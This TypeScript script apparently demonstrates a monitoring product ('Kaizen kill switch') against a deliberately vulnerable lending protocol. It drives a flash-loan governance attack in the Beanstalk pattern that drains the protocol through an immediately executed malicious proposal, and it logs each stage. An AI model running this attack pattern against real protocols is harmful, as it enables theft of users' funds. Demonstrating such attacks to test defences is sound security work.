 

import { ethers, Contract } from "ethers";
import {
  banner, step, success, warn, etherscan, sleep, waitAndLog, eth,
  getAttackerWallet, C,
  GOVERNANCE_ABI, LENDING_ABI,
} from "./utils";

async function main() {
  banner("ATTACK 3: GOVERNANCE ATTACK  (Beanstalk pattern, $182M)");

  const attacker = getAttackerWallet();

  const protocol = new Contract(
    process.env.KAIZEN_LEND_ADDRESS!,
    LENDING_ABI,
    attacker
  );
  const attackContract = new Contract(
    process.env.GOVERNANCE_ATTACKER_ADDRESS!,
    GOVERNANCE_ABI,
    attacker
  );

  const tvlBefore = await protocol.totalLiquidity() as bigint;

  console.log(`${C.dim("Protocol TVL:")} ${eth(tvlBefore)}`);
  console.log(`${C.dim("Quorum:")}       1 vote (no minimum — intentional vulnerability)`);
  console.log(`${C.dim("Timelock:")}     None (proposals execute immediately)`);
  console.log();
  console.log(C.dim("  Beanstalk had no timelock on emergency governance."));
  console.log(C.dim("  The attacker flash-loaned $1B of governance tokens, created a"));
  console.log(C.dim("  malicious proposal, voted with the borrowed tokens, and executed"));
  console.log(C.dim("  it — all in a single atomic transaction."));
  console.log();

  attackContract.on("VotingPowerAcquired", (amount: bigint) => {
    step(1, `Voting power acquired: ${ethers.formatEther(amount)} tokens`);
    console.log(C.red(`     → This is 1000x more than all legitimate holders combined`));
  });

  attackContract.on("MaliciousProposalCreated",
    (proposalId: bigint, target: string, amount: bigint) => {
      step(2, `Malicious proposal created: #${proposalId}`);
      console.log(`     ${C.dim("Target:")}  ${target}`);
      console.log(`     ${C.dim("Action:")}  emergencyWithdraw(attacker, ${eth(amount)})`);
    }
  );

  attackContract.on("ProposalExecuted", (proposalId: bigint, amount: bigint) => {
    step(3, C.red(`Proposal #${proposalId} executed — ${eth(amount)} drained`));
    console.log(C.red(`     → No timelock. Created and executed in same block.`));
  });

  attackContract.on("AttackComplete", (stolen: bigint) => {
    console.log();
    success(C.bold(`Governance attack complete — stolen: ${eth(stolen)}`));
  });

  console.log(C.bold("Executing atomic governance attack..."));
  console.log(C.dim("(acquire power → create proposal → execute → drain — all in one tx)"));
  console.log();

  const attackTx = await attackContract.attack({
    gasLimit: 600_000,
  });

  const receipt = await waitAndLog(attackTx, "Governance attack confirmed");
  console.log();

  await sleep(3000);

  const tvlAfter = await protocol.totalLiquidity() as bigint;
  const isPaused = await protocol.isPaused() as boolean;

  const acquiredPower = await attackContract.acquiredVotingPower() as bigint;
  const proposalId    = await attackContract.proposalId() as bigint;
  const proposal      = await protocol.proposals(proposalId) as any[];

  step(4, "Post-attack state:");
  console.log(`  ${C.dim("TVL before:")}           ${eth(tvlBefore)}`);
  console.log(`  ${C.dim("TVL after:")}            ${eth(tvlAfter)}`);
  console.log(`  ${C.dim("Voting power used:")}    ${ethers.formatEther(acquiredPower)} tokens`);
  console.log(`  ${C.dim("Proposal executed:")}    ${proposal[3]}`);
  console.log(`  ${C.dim("Created at block:")}     ${proposal[4]}`);
  console.log(`  ${C.dim("Current block:")}        ${receipt.blockNumber}`);
  console.log();

  if (isPaused) {
    success(C.bold("🛡  KAIZEN KILL SWITCH FIRED"));
  } else {
    warn(
      `Protocol drained but not paused — Kaizen detected after the fact. ` +
      `In production, Kaizen monitors pending txs to catch this pre-execution.`
    );
  }

  console.log(C.dim(`\n  Attack tx: ${etherscan(attackTx.hash)}`));
  attackContract.removeAllListeners();
}

main().catch(e => {
  console.error(C.red("Attack failed:"), e.message);
  process.exit(1);
});
